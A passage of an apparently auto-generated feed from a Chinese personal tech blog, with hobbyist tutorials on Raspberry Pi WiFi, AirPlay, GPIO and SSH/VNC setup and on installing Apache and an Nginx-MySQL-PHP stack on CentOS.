<p>我的配置文件像这样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</div><div class="line"># Please note that this file is written to be used with dhcpcd</div><div class="line"># For static IP, consult /etc/dhcpcd.conf and &apos;man dhcpcd.conf&apos;</div><div class="line"># Include files from /etc/network/interfaces.d:</div><div class="line">source-directory /etc/network/interfaces.d</div><div class="line">auto lo</div><div class="line">#iface lo inet loopback</div><div class="line">iface eth0 inet dhcp</div><div class="line">auto wlan0</div><div class="line">allow-hotplug wlan0</div><div class="line"># iface wlan0 inet manual</div><div class="line"># wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf</div><div class="line"># iface default inet dhcp</div><div class="line">iface wlan0 inet dhcp</div><div class="line">wpa-ssid &quot;yourssid&quot;</div><div class="line">wpa-psk &quot;password&quot;</div></pre></td></tr></table></figure></p>
<p>将其中的<code>wpa-ssid</code>和<code>wpa-psk</code>换成你的无线网络名和密码即可。<br>一般来说重新启动下树莓派无线网络即可自动连接。</p>
<h3 id="Shairport让树莓派支持AirPlay"><a href="#Shairport让树莓派支持AirPlay" class="headerlink" title="Shairport让树莓派支持AirPlay"></a>Shairport让树莓派支持AirPlay</h3><p>首先介绍下AirPlay，内容来源<a href="https://support.apple.com/zh-cn/HT204289" target="_blank" rel="external">Apple support</a>:  </p>
<blockquote>
<p>借助 AirPlay，您可以将音乐、照片和视频流化到 Apple TV，或者将音乐流化到 AirPort Express 或已启用 AirPlay 的扬声器。借助 AirPlay 镜像，您可以在 Apple TV 上显示 iOS 屏幕。  </p>
</blockquote>
<p>我们通过一个开源软件shairport让树莓派支持Apple的AirPlay。你可以提前连接独立声卡和音响。至于为什么需要独立声卡，你可以插上耳机感受下树莓派的底噪，音质感人～</p>
<h4 id="安装shairport及其依赖包"><a href="#安装shairport及其依赖包" class="headerlink" title="安装shairport及其依赖包"></a>安装shairport及其依赖包</h4><p>在终端执行如下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install  libao-dev libssl-dev git avahi-utils libwww-perl</div><div class="line">sudo apt-get install libcrypt-openssl-rsa-perl libio-socket-inet6-perl  libmodule-build-perl</div></pre></td></tr></table></figure></p>
<p>然后在合适的地方建个文件夹，cd到文件夹目录接着:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/njh/perl-net-sdp.git</div><div class="line">cd perl-net-sdp</div><div class="line">perl Build.PL</div><div class="line">./Build</div><div class="line">./Build test</div><div class="line">sudo ./Build install</div><div class="line">cd ..</div><div class="line">git clone https://github.com/abrasive/shairport.git</div><div class="line">cd shairport</div><div class="line">make</div></pre></td></tr></table></figure></p>
<p>运行shairport:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./shairport -a &quot;raspberry pi&quot;</div></pre></td></tr></table></figure></p>
<p>之后在iPhone或者iPad上就可以看到这个AirPlay的选项，如图:<br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzjw1f1dvytz5awj30hs0vkada.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzjw1f1dvz5gmb3j30hs0vk3zh.jpg" alt=""><br>享受音乐吧(☆_☆)</p>
<h3 id="omxplayer播放器"><a href="#omxplayer播放器" class="headerlink" title="omxplayer播放器"></a>omxplayer播放器</h3><p>omxplayer是没有图形界面的，只能通过命令行来操作，不过它麻雀虽小五脏具全。<br>在终端中直接输入omxplayer就会出现相关的帮助信息，还给出了示例。在这里我就不介绍它的具体用法了。   </p>
<h3 id="一点心得"><a href="#一点心得" class="headerlink" title="一点心得"></a>一点心得</h3><p>因为开源硬件得天独厚的软件生态，树莓派可DIY的东西被无限延伸。操作起来也并不像人们想象的那么复杂，不是计算机相关专业的同学们也可以快速上手。在我这次的尝试中发现了一些小小的问题。可能是树莓派制作成本的限制，其音频输出相当的糟糕，干扰非常严重。想用树莓派直接用HDMI连接电视做高清机顶盒的同学们一定记得给树莓配上一块独立声卡，HDMI的音频输出也是相当糟糕=)</p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;Raspberry Pi比较入门的玩法就是用它来实现电视机机顶盒的一些功能，大家都知道树莓派上有大名鼎鼎的XBMC影音播放系统，安装完后完全可以当作网络机顶盒使用。但是我今天不会介绍XBMC，在我的方案里我通过树莓派将iPhone的音频直接输出到电视上，另外使用omxplayer进行视频播放。
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Pi" scheme="https://hsmouc.com/tags/Pi/"/>
    
  </entry>
  
  <entry>
    <title>centos搭建LNMP服务器</title>
    <link href="https://hsmouc.com/2016/02/19/2016-02-19-vps/"/>
    <id>https://hsmouc.com/2016/02/19/2016-02-19-vps/</id>
    <published>2016-02-19T06:20:15.000Z</published>
    <updated>2016-10-22T15:40:56.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>我们首先来看一张图片:<img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f14m96z58dj313t0odagt.jpg" alt="Fuck DDOS">    </li>
<li>前天折腾完apache，顺便装好了MySQL和PHP，放了一个Discuz!的开源论坛程序，什么乱七八糟权限都没管，全是弱密码。刚准备写个博纪念一下，发现我VPS被人黑了……无奈只好重新安装一遍centos。在<a href="http://lyeec.me" target="_blank" rel="external">vagarlee</a>的建议下，我吸取上一次的教训，使用更轻量的Nginx来替代Apache。<a id="more"></a> 
<h3 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h3>在使用yum安装Nginx的时候有一些小小的麻烦,需要自己建立一个<code>nginx.repo</code>的软件源配置文件。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/yum.repo.d/nginx.repo</div></pre></td></tr></table></figure>
</li>
</ul>
<p>在其中填写如下内容:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[nginx]</div><div class="line">name=nginx repo</div><div class="line">baseurl=http://nginx.org/packages/centos/$releasever/$basearch/</div><div class="line">gpgcheck=0</div><div class="line">enabled=1</div></pre></td></tr></table></figure></p>
<p>保存，使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install nginx</div></pre></td></tr></table></figure></p>
<p>nginx安装完成。<br>启动Nginx服务:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx start</div></pre></td></tr></table></figure></p>
<p>这个时候访问VPS的IP地址应该就能出现Nginx的欢迎页面了。</p>
<h3 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install mysql-server mysql mysql-deve</div></pre></td></tr></table></figure>
<p>我第一次安装MySQl的时候想当然只安装了mysql，并没有安装mysql-server导致数据库无法使用，mysql-server是一个服务端，需要安装。<br>启用MySQl服务:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service mysqld start</div></pre></td></tr></table></figure></p>
<p>这时候会出现长长的提示信息，恭喜数据库安装成功。<br>接下来我们给数据库设置管理员账号和密码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysqladmin -u root password &apos;yourpassword&apos;</div></pre></td></tr></table></figure></p>
<h3 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h3><p>这一步比较简单，直接使用yum:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install php-fpm php-mysql</div></pre></td></tr></table></figure></p>
<ul>
<li>至此，LNMP环境的软件包已经全部安装完成，下面就是简单的配置阶段。</li>
</ul>
<h3 id="配置PHP"><a href="#配置PHP" class="headerlink" title="配置PHP"></a>配置PHP</h3><p>更改下面的文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/php.ini</div></pre></td></tr></table></figure></p>
<p>将1改为0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgi.fix_pathinfo = 0</div></pre></td></tr></table></figure></p>
<p>这儿有一段英文解释，来自<a href="www.digitalocean.com">digitalocean</a>:</p>
<blockquote>
<p>If this number is kept as a 1, the php interpreter will do its best to process the file that is as near to the requested file as possible. This is a possible security risk. If this number is set to 0, conversely, the interpreter will only process the exact file path—a much safer alternative.</p>
</blockquote>
<h3 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h3><p>主要是改一下Nginx.conf这个文件夹里的配置文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/nginx/conf.d/default.conf</div></pre></td></tr></table></figure></p>
<p>改成了这样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">server&#123;</div><div class="line"></div><div class="line">    listen       80;</div><div class="line">    server_name  localhost;</div><div class="line"></div><div class="line">    #charset koi8-r;</div><div class="line">    #access_log  /var/log/nginx/log/host.access.log  main;</div><div class="line"></div><div class="line">    location / &#123;</div><div class="line">        root   /usr/share/nginx/html;</div><div class="line">        index  index.html index.htm index.php;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    #error_page  404              /404.html;</div><div class="line"></div><div class="line">    # redirect server error pages to the static page /50x.html</div><div class="line">    #</div><div class="line">    error_page   500 502 503 504  /50x.html;</div><div class="line">    location = /50x.html &#123;</div><div class="line">        root   /usr/share/nginx/html;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</div><div class="line">    #</div><div class="line">    #location ~ \.php$ &#123;</div><div class="line">    #    proxy_pass   http://127.0.0.1;</div><div class="line">    #&#125;</div><div class="line"></div><div class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</div><div class="line">    #</div><div class="line">    location ~ \.php$ &#123;</div><div class="line">        root           /usr/share/nginx/html;</div><div class="line">        fastcgi_pass   127.0.0.1:9000;</div><div class="line">        fastcgi_index  index.php;</div><div class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</div><div class="line">        include        fastcgi_params;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>改<code>server_name</code>后面的地址为<code>localhost</code></li>
<li>改<code>location</code>中的<code>root</code>地址为<code>/usr/share/nginx/html</code></li>
<li>在index        index.html        index.htm后加上index.php</li>
<li>把<code>&quot;location ~ \.php$ {&quot;,</code>前的注释去了，改<code>fastcgi_param</code>后面的内容为<code>SCRIPT_FILENAME  $document_root</code></li>
</ul>
<p>保存退出后打开php-fpm的配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/php-fpm.d/www.conf</div></pre></td></tr></table></figure></p>
<p>找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">; Unix user/group of processes</div><div class="line">; Note: The user is mandatory. If the group is not set, the default user&apos;s group</div><div class="line">;	will be used.</div><div class="line">; RPM: apache Choosed to be able to access some dir as httpd</div><div class="line">user = nginx</div><div class="line">; RPM: Keep a group allowed to write in log dir.</div><div class="line">group = nginx</div></pre></td></tr></table></figure></p>
<p>改成<code>User=nginx</code>，<code>group=nginx</code><br>重新启动php-fpm即可</p>
<h3 id="参考的文档"><a href="#参考的文档" class="headerlink" title="参考的文档"></a>参考的文档</h3><p><a href="http://nginx.org/en/docs/" target="_blank" rel="external">Nginx官方文档</a><br><a href="https://support.rackspace.com/how-to/installing-nginx-and-php-fpm-setup-for-nginx/" target="_blank" rel="external">Installing Nginx and php-fpm - Setup For Nginx</a><br><a href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/" target="_blank" rel="external">Nginx -PHP FastCGI Example</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;我们首先来看一张图片:&lt;img src=&quot;http://ww3.sinaimg.cn/large/005WMcFzjw1f14m96z58dj313t0odagt.jpg&quot; alt=&quot;Fuck DDOS&quot;&gt;    &lt;/li&gt;
&lt;li&gt;前天折腾完apache，顺便装好了MySQL和PHP，放了一个Discuz!的开源论坛程序，什么乱七八糟权限都没管，全是弱密码。刚准备写个博纪念一下，发现我VPS被人黑了……无奈只好重新安装一遍centos。在&lt;a href=&quot;http://lyeec.me&quot;&gt;vagarlee&lt;/a&gt;的建议下，我吸取上一次的教训，使用更轻量的Nginx来替代Apache。
    
    </summary>
    
      <category term="服务器" scheme="https://hsmouc.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    
      <category term="Linux" scheme="https://hsmouc.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>centos搭建服务器－安装apache</title>
    <link href="https://hsmouc.com/2016/02/16/2016-02-16-vps/"/>
    <id>https://hsmouc.com/2016/02/16/2016-02-16-vps/</id>
    <published>2016-02-16T02:40:25.000Z</published>
    <updated>2016-10-22T15:41:01.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>好久都没更新博客里面的文章了，快要开学了发现寒假自己什么都没搞出来啊啊啊……最蛋疼的是学校的智能车比赛的网站，要实现论坛的功能。学校的服务器现在又不让用，只好在我自己的VPS上搭建一个简易的服务器来测试了。这是我开始自己搭服务器过程的记录，可能会有点乱……<a id="more"></a> </li>
<li>我在本地使用的是Mac OS X，远程服务器运行的是centos-6 x86系统。这个VPS是在<a href="https://bandwagonhost.com/" target="_blank" rel="external">Bandwagon</a>上购买的，可以使用shadowsocks科学上网(咦，我好像说了什么不该说的)。</li>
</ul>
<p>##LAMP环境<br>所谓LAMP就是Linux+apache+MySQL+PHP，我目前只装好了apache……不然怎么能是万里长征第一步～</p>
<p>###安装Apache<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yum install httpd</div><div class="line">chkconfig --level 235 httpd on</div><div class="line">/etc/init.d/httpd start</div></pre></td></tr></table></figure></p>
<p>安装完后在浏览器中输入远程服务器的IP地址，看到这样的画面就说明安装成功了。<img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f11dv2fa1hj31700rh15c.jpg" alt="屏幕快照"></p>
<p>###配置ssh<br>配置ssh的目的在于方便的上传和下载文件，更加流畅的终端输入体验……<br>在终端中输入如下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install openssh-server</div></pre></td></tr></table></figure></p>
<p>安装完成后启动sshd服务:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/sshd start</div></pre></td></tr></table></figure></p>
<p>设置开机启动:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chkconfig sshd on</div></pre></td></tr></table></figure></p>
<p>我在本地使用:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh root@138.128.197.11</div></pre></td></tr></table></figure></p>
<p>报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh: connect to host 138.128.197.11 port 22: Connection refused</div></pre></td></tr></table></figure></p>
<p>我用<code>netstat -antp |grep sshd</code>命令查看了一下，系统的响应是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcp        0      0 0.0.0.0:22           0.0.0.0:*                   LISTEN      3746/sshd</div></pre></td></tr></table></figure></p>
<p>问题应该是出在了ssh的隧道没有对公网开放<br>修改ssh的配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/ssh/sshd_config</div></pre></td></tr></table></figure></p>
<p>把<code>ListenAddress 0.0.0.0</code>改为<code>ListenAddress 138.128.197.11</code>这个是我远程服务器的IP，重新启动ssh服务发现无法启动，终端提示要先定义端口，我并不知道为什么……在刚刚那行配置前加上<code>port 22</code>然后<code>service sshd restart</code>，居然就成功了<br>附上成功后的图<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f11duxql7pj313r0p0167.jpg" alt="屏幕快照"> </p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;好久都没更新博客里面的文章了，快要开学了发现寒假自己什么都没搞出来啊啊啊……最蛋疼的是学校的智能车比赛的网站，要实现论坛的功能。学校的服务器现在又不让用，只好在我自己的VPS上搭建一个简易的服务器来测试了。这是我开始自己搭服务器过程的记录，可能会有点乱……
    
    </summary>
    
      <category term="操作系统" scheme="https://hsmouc.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="Linux" scheme="https://hsmouc.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>通过python控制Pi的GPIO</title>
    <link href="https://hsmouc.com/2015/12/17/2015-12-17-pi/"/>
    <id>https://hsmouc.com/2015/12/17/2015-12-17-pi/</id>
    <published>2015-12-17T02:40:25.000Z</published>
    <updated>2016-10-22T15:41:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python-GPIO集成库"><a href="#python-GPIO集成库" class="headerlink" title="python GPIO集成库"></a>python GPIO集成库</h2><p>我大概了解了下树莓派的几种库，比较常见的有python GPIO，BCM2835    C    Library还有wiringPi，其实对于我们自动化的学生来说最熟悉的应该就是wiringPi。Pi的官方资料中推荐的是python GPIO，而且相较于C，python更加简洁易读。<br> <a id="more"></a> </p>
<h2 id="让LED闪烁"><a href="#让LED闪烁" class="headerlink" title="让LED闪烁"></a>让LED闪烁</h2><p>在这个实验中，我只是简单的控制了一个GPIO口，输出一个方波信号，占空比50%，这样就可以让一个LED小灯闪烁。  </p>
<ul>
<li>连接实验电路<br>在单片机学习中，掌握好各个引脚的功能是非常重要的，要根据电路的连接来写相关的控制程序。在Pi中我们可以使用<code>GPIO readall</code>来列出所有的引脚，便于我们下一步操作。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzgw1ez451il6owj30fu0cjjue.jpg" alt="引脚图"><br>然后将LED，电阻串联起来，LED正端接GPIO口，负接地。记得用杜邦线，拿着导线乱碰很可能导致引脚短路，损坏Pi。   </li>
<li>Python代码部分<br>新建LED.py文件，加入以下代码:   <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blink</span><span class="params">(pin)</span>:</span></div><div class="line">        GPIO.output(pin,GPIO.HIGH)</div><div class="line">        time.sleep(<span class="number">1</span>)</div><div class="line">		GPIO.output(pin,GPIO.LOW)</div><div class="line">        time.sleep(<span class="number">1</span>)</div><div class="line">        <span class="keyword">return</span></div><div class="line">GPIO.setmode(GPIO.BOARD)</div><div class="line">GPIO.setup(<span class="number">7</span>,GPIO.OUT）</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">        blink(<span class="number">7</span>)</div><div class="line">GPIO.cleanup()</div></pre></td></tr></table></figure>
</li>
</ul>
<p>然后执行下试试吧～<br><img src="http://ww4.sinaimg.cn/large/005WMcFzgw1ez452ev870j31kw16oncv.jpg" alt="点亮的LED"><br>图是随手拍的，桌上的电阻都有点大了，亮起来不明显。建议大家还是串上一个阻值合适的电阻，GPIO输出的电压幅值好像是1V。当然大家就不要作死把发光二极管直接接在3.3V和GND之间了，不要问我是怎么知道的+_+，我炸了一个。<br>可以通过:   </p>
<pre><code class="c">pi@raspberrypi:~/Desktop $ sudo cat /sys/kernel/debug/gpio
GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<span class="number">3f</span>200000.gpio, pinctrl-bcm2835:
 gpio<span class="number">-35</span>  (?                   ) in  hi
 gpio<span class="number">-47</span>  (?                   ) out lo
</code></pre>
<p>来查看引脚状态。</p>
<p>最后说两句题外话吧:<br>其实系里还是挺关心我们的，想要什么小零件基本都能提供。模电老师还给我们每个人准备了一个小器件包，里面有面包版，各种电容电阻什么的。虽然都不是什么精贵的东西，但看到宿舍里有各种各样的小元件和各种工具，总有一种迷之幸福感。万用表好像也可以向系里申请了，还是希望系里越来越好吧（≧∇≦）</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;python-GPIO集成库&quot;&gt;&lt;a href=&quot;#python-GPIO集成库&quot; class=&quot;headerlink&quot; title=&quot;python GPIO集成库&quot;&gt;&lt;/a&gt;python GPIO集成库&lt;/h2&gt;&lt;p&gt;我大概了解了下树莓派的几种库，比较常见的有python GPIO，BCM2835    C    Library还有wiringPi，其实对于我们自动化的学生来说最熟悉的应该就是wiringPi。Pi的官方资料中推荐的是python GPIO，而且相较于C，python更加简洁易读。&lt;br&gt;
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Pi" scheme="https://hsmouc.com/tags/Pi/"/>
    
      <category term="Python" scheme="https://hsmouc.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Raspberry Pi开启SSH和VNC</title>
    <link href="https://hsmouc.com/2015/12/13/2015-12-13-pi/"/>
    <id>https://hsmouc.com/2015/12/13/2015-12-13-pi/</id>
    <published>2015-12-13T02:40:25.000Z</published>
    <updated>2016-10-22T15:41:10.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>Raspberry装好了，显示器也搞定了，玩了整整一天(☆_☆)，发现了一个小问题：我的桌面不够大呀！！！显示器，树莓，笔记本电脑，外卖，概率作业不够放了怎么破，立马想到看过可以通过SSH和VNC的方式访问Pi，来试试吧！  </p>
<a id="more"></a> 
</li>
</ul>
<h2 id="两种方式"><a href="#两种方式" class="headerlink" title="两种方式"></a>两种方式</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>命令行访问Pi，轻巧且功能强大。简单配置一下Pi,打开SSH服务即可:<br><code>service ssh start</code><br>在Mac终端输入:<br><code>sudo ssh pi@192.168.1.6</code>  </p>
<p><code>192.168.1.6</code>是Pi的ip。输入Pi的密码就可以连上了。更多的配置不细讲了，<a href="http://www.jianshu.com/p/a011d01bdf51" target="_blank" rel="external">简书</a>的这篇文章提到了关于配置root用户ssh登录的权限问题，<a href="http://liberize.me/tech/access-raspberry-pi-via-ssh-and-vnc.html" target="_blank" rel="external">liberize.blog</a>提到了使用私钥登录的问题。  </p>
<h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><p>如果要使用Pi的图形界面，大家可以使用VNC服务。Pi需要安装vnc服务端，并在Mac上安装tigervnc(icon挺帅的)。   </p>
<h4 id="Pi的配置"><a href="#Pi的配置" class="headerlink" title="Pi的配置"></a>Pi的配置</h4><p>我查到的资料大多数是在Pi上安装tightvncserver<code>sudo apt-get install tightvncserver</code>，简单的配置下用<code>service start tightvncserver</code>发现终端报错了。找不到目录的原因不清楚……<br>我发现在Jessie中貌似已经安装VNC服务，抱着试试的心态输入<code>vncserver</code><br>终端出现了帮助页面，可以这样打开VNC服务:<br><code>vncserver:1</code></p>
<h4 id="Mac的配置"><a href="#Mac的配置" class="headerlink" title="Mac的配置"></a>Mac的配置</h4><p>安装tigervnc<a href="https://github.com/TigerVNC/tigervnc/releases" target="_blank" rel="external">下载</a>，编译安装。<br>发现Homebrew可以直接装，果断弃了tar.gz<br><code>brew cask install tigervnc-viewer</code><br>打开tigervnc，输入<code>192.168.1.6</code>，点Connect就连上啦。  </p>
<h2 id="惯例"><a href="#惯例" class="headerlink" title="惯例"></a>惯例</h2><p>放上一些图片吧<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1eyyf1w019uj32io1w0hdt.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1eyyf1woamxj31400p0dk1.jpg" alt=""><br>发现屏下面垫一个橡皮还蛮不错的…… 下一阶段是学习GPIO的使用，主要还是使用WiringPi或者BCM2835    C    Library来写，Python正在学ˊ_&gt;ˋ     </p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;Raspberry装好了，显示器也搞定了，玩了整整一天(☆_☆)，发现了一个小问题：我的桌面不够大呀！！！显示器，树莓，笔记本电脑，外卖，概率作业不够放了怎么破，立马想到看过可以通过SSH和VNC的方式访问Pi，来试试吧！  &lt;/p&gt;
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Pi" scheme="https://hsmouc.com/tags/Pi/"/>
    
  </entry>
  
  <entry>
    <title>Raspberry Pi上手体验</title>
    <link href="https://hsmouc.com/2015/12/12/2015-12-12-pi/"/>
    <id>https://hsmouc.com/2015/12/12/2015-12-12-pi/</id>
    <published>2015-12-12T03:40:25.000Z</published>
    <updated>2017-01-03T15:16:19.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>生日快到了，女票送了一个树莓ψ(｀∇´)ψ,好开心，简单写下使用体验吧。<a id="more"></a> 
<h2 id="Raspberry-Pi简介"><a href="#Raspberry-Pi简介" class="headerlink" title="Raspberry Pi简介"></a>Raspberry Pi简介</h2>树莓派（英语：Raspberry Pi），是一款基于Linux系統的只有信用卡大小的单片机电脑。它由英国的树莓派基金会所开发，目的是以低价硬件及自由软件刺激在学校的基本电脑科学教育。配备有Broadcom出产的ARM架构700MHz BCM2836处理器，1G内存，还有一些必须的接口。<br>除了电脑上都有的接口，树莓派还有GPIO的拓展接口，这为工科狗实现一些很有意思的想法提供了巨大的空间，比如四轴飞行器，智能小车什么的。先留个坑，以后再填吧。<h2 id="系统的安装"><a href="#系统的安装" class="headerlink" title="系统的安装"></a>系统的安装</h2></li>
</ul>
<ol>
<li>在Pi的官网上下载系统镜像<a href="https://www.raspberrypi.org/downloads" target="_blank" rel="external">(下载页面)</a>,我选择的是Raspbian(名字Raspberry+Debian233),解压后得到一个.img镜像。 </li>
<li>插入TF卡，用df命令查看当前挂载的卷：<br><code>df -h</code><br>确认设备<br><code>diskutil list</code><br>确定一下你的TF卡是哪个。</li>
<li>卸载TF卡上的分区<br><code>diskutil unmount /dev/disk2   // /dev/disk2是我的TF卡</code></li>
<li>将系统刷入卡中<br>把当前目录切换到要装载的系统镜像的所在目录<br><code>sudo dd bs=4m if=2015-11-21-raspbian-jessie.img of=/dev/rdisk2</code><br>输入密码后不会出现任何提示，要等上几分钟，别着急用ctrl+c结束。</li>
<li>卸载设备<br><code>diskutil unmountDisk /dev/disk2</code>    </li>
</ol>
